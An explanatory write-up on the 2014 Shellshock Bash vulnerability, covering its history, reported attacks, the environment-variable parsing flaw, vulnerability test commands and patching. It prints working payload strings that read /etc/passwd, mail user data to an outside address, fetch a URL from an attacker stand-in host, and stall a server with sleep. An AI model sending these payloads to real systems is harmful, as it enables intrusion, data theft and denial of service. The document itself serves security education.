# Commandline Injection with Shellshock 
## _By: Alyzeh Fahim and Abdelrahman Youssef_

## What is Shellshock?

Shellshock vulnerability is targeted at Bash (Bourne-Again Shell) , is a command-line interpreter used by various Unix-based systems and serves as their default login shell. Shellshock is a bug in the Bash command-line interface shell that was discovered on 24th September 2014 by Stéphane Chazelas, a French manager working for a software maker in Scotland. It has existed for about 20 years but ever since its discovery, it has been considered a critical threat to the computing world. 
## The Impact 
The Shellshock bug within Bash allows malicious users to remotely execute commands, when the commands get added to the end of function definitions stored in the values of environment variables. This vulnerability could be exploited to take full control of the system, obtain sensitive information such as authentication credentials and credit card details, or extend access to other connected systems within the same network.
It is known to affect any device using Linux and Unix and is also known to affect hardware running Mac’s OS X operating system. It also poses a threat to Internet-of-things devices which are essentially built using the bash program. Many Internet-based systems, including web servers, e-mail servers and DNS servers which use Bash are also under risk. The vulnerability is currently known to affect Bash version 1.14 up through 4.3.
The vulnerability score given to this bug (CVE-2014-6271) is a 10 out of 10, which is very high and considered critical. The score is assigned a high value in terms of its severity, impact and exploitability, but low in terms of its complexity, meaning that it could be easily used by hackers.
Ever since its discovery in September 2014, Shellshock took the world by storm. It drew attention from the media due to the dangerous nature of the attack. At the same time, it drew comparisons with Heartbleed, another malicious bug with dire effects. The Shellshock vulnerability is concerning as it has the potential to affect millions of systems running the vulnerable version of Bash, ranging from computers, mobiles to various internet connected devices. The effects are more far-reaching, and attacks can be used to not only steal private information but also gain control over the entire machine.

## Shellshock Attacks
After the announcement of the bug in September a series of attacks followed. One of the deadliest attacks include the one where botnets using the exploit on computers were used to launch denial of service of attacks.  In September 2014, it was reported that Webpots were used for DDoS attack against Akami technologies. Incapsula, the security firm, claimed that in a day they witnessed 17,400 attacks, at an average rate of 725 attacks per hour. The researchers said that more than 1,800 web domains had been attacked and that the attacks originated from 400 unique I.P. addresses. [1] During 2014, it was also reported that Yahoo servers became a target of a Shellshock attack.

## Shellshock Exploits
### Eject
HTTP request consists of several components which include request line, header fields and body message. The headers given in the example below are Accept-Encoding, Accept-Language and the /main is the homepage. These headers provide the web server with information about the capabilities the web browser, preferred language, the web site being requested, and what browser is being used.


```sh
GET / HTTP/1.1
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8,fr;q=0.6
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
Host: cloudflare.com
```

At times this information can be turned into variables so that the web server can examine them. The server becomes vulnerable when these variables get are passed into the shell called "bash" leading to the Shellshock attack. 

```sh
HTTP_ACCEPT_ENCODING=gzip,deflate,sdch
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.8,fr;q=0.6
HTTP_CACHE_CONTROL=no-cache
HTTP_PRAGMA=no-cache
HTTP_USER_AGENT=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
HTTP_HOST=cloudflare.com
```
The Shellshock attack occurs when an attacker modifies the origin HTTP request to contain the magic () { :; }; string. HTTP_USER_AGENT= is appended by this string along the bin/eject command. When variable gets passed into bash by the web server, the Shellshock exploit happens. The variable http user agent will be interpreted as command that needs to be executed by bash and which in this case is bin/eject. This cause the CD or DVD drive to eject.

    HTTP_USER_AGENT=() { :; }; /bin/eject

### Extract Private Information 
Using the /etc/passwd command, the attacker is able to read and access the password file. This file then gets added to the response from the web server and is returned in the form of a webpage. 

    () {:;}; /bin/cat /etc/passwd

The following command allows the attacker to email private information to themselves. The whoami command tells what the name of the user is and in case if the user is root, that can work in the attackers favour as they can exploit the system further. The username and the name of the website are sent in email where attacker is able to access the information of vulnerable sites. 

    () { :;}; /bin/bash -c \"whoami | mail -s 'example.com l' xxxxxxxxxxxxxxxx@gmail.com
### Reconnaissance Attacks
One of the most common Shellshock attacks are reconnaissance attacks. The attacker uses a command to send a message to third party machine asking for list of vulnerable machines. The attacker makes the web server download a webpage, and then uses its web server logs to see which sites and machines are vulnerable. 

    () {:;}; /usr/bin/wget http://attacker-controlled.com/ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA== >> /dev/null

The string below is a base64 encoded string which actually lets the attacker know that example.com is vulnerable. This allows the attacker to exploit the website further.

    example.comShellShockSalt

### Denial of Service Attack
There are three different sleep commands being used in the command below. This can make the machine do nothing for 20 seconds and in essence puts it to sleep. Sending these commands constantly can cause the machine to do thing and this can lead to a denial of service attack [2].

    () { :;}; /bin/sleep 20|/sbin/sleep 20|/usr/bin/sleep 20

## How Does Shellshock Impact Systems?
It affects all applications and products that use Bash shell and parse enviroment variables values. If an application executes another binary, it's likely that Bash is being used. There were a couple of cases and patches released to remedy this vulnerability. The latest patch for CVE-2014-7169 introduced changes to how Bash evaluates environment variables [4].

## How does Shellshock actually work?
In a vulnerable version of bash the output of the following the following command is a line containing only the word vulnerable. 
```
env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c "echo test"
```
The echo command executes after the end of the bash function, but this shouldn't happen. Then why does it work?
In addition to being a terminal prompt, Bash is also a scripting language, in which you can define functions [3]. It can be done like this:
```
yayfedora() { echo "Fedora is awesome."; }
```
Then it can be executed like this:
```sh
$ yayfedora 
Fedora is awesome.
```
Now let's say we want to execute this function in a new instance of Bash. We can do it like this:
```
$ bash -c yayfedora
bash: yayfedora: command not found
```
The new instance didn't inherit the function definition from the original Bash instance, however it inherits it's environment [3]. To execute this function we can export it before running it in the new instance, like this:
```
$ export -f yayfedora
$ bash -c yayfedora
Fedora is awesome.
```
Basically, since there is no Linux/Unix magic for doing functions in environment variables, the export function just creates a regular environment variable containing the function definition. Then, when the second shell reads the “incoming” environment and encounters a variable with contents that look like a function, it evaluates it [3].

This mechanism seems safe in theory, however there was a bug in the code where the evaluation didn’t stop when the end of the function definition was reached, it just kept going.

The “env” command runs a command with a given variable set. In this case, we’re setting “x” to something that looks like a function. The function is just a single “:”, which is actually a simple command which is defined as doing nothing. But then, after the semi-colon which signals the end of the function definition, there’s an echo command. That’s not supposed to be there, but there’s nothing stopping us from doing it. Then, the command given to run with this new environment is a new bash shell, again with a “do nothing :” command, after which it will exit, completely harmless. However, when that new shell starts up and reads the environment, it gets to the “x” variable, and since it looks like a function, it evaluates it. The function definition gets loaded and then our malicious payload is triggered too. So, if you run the above on a vulnerable system, you’ll get “OOPS” printed, but an attacker can do much more than just print something [3].

## Fixing The Vulnerability
There were a couple of Bash versions released to remidy this vulnerability. Different Bash versions will print different outputs when testing using the first command. The versions with the original CVE-2014-6271 fix applied produce the following output:
```
$ env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c "echo test"
bash: warning: x: ignoring function definition attempt
bash: error importing function definition for `x'
bash: error importing function definition for `BASH_FUNC_x()'
test
```
This fix was incomplete as there was another vulnerability which allowed remote attackers to write to files or possibly have unknown other impact via a crafted environment [5]. We can test if the fix for CVE-2014-7169  was applied in a version using the following command:
```
$ cd /tmp; rm -f /tmp/echo; env 'x=() { (a)=>\' bash -c "echo date"; cat /tmp/echo
bash: x: line 1: syntax error near unexpected token `='
bash: x: line 1: `'
bash: error importing function definition for `x'
Fri Sep 26 11:49:58 GMT 2014
```
If the system prints the date/time and the file /tmp/echo is created then the system is vulnerable [4]. On the other hand, if a system is not vulnerable, the output will be similar to the following:
```
$ cd /tmp; rm -f /tmp/echo; env 'x=() { (a)=>\' bash -c "echo date"; cat /tmp/echo
date
cat: /tmp/echo: No such file or directory
```

To fix a vulnerable system you can update Bash to the latest version using the following command:
```
yum update bash
```




## References
[1] https://bits.blogs.nytimes.com/2014/09/26/companies-rush-to-fix-shellshock-software-bug-as-hackers-launch-thousands-of-attacks/
[2] https://blog.cloudflare.com/inside-shellshock/ 
[3] https://fedoramagazine.org/shellshock-how-does-it-actually-work/
[4] https://access.redhat.com/articles/1200223
[5] https://nvd.nist.gov/vuln/detail/CVE-2014-7169

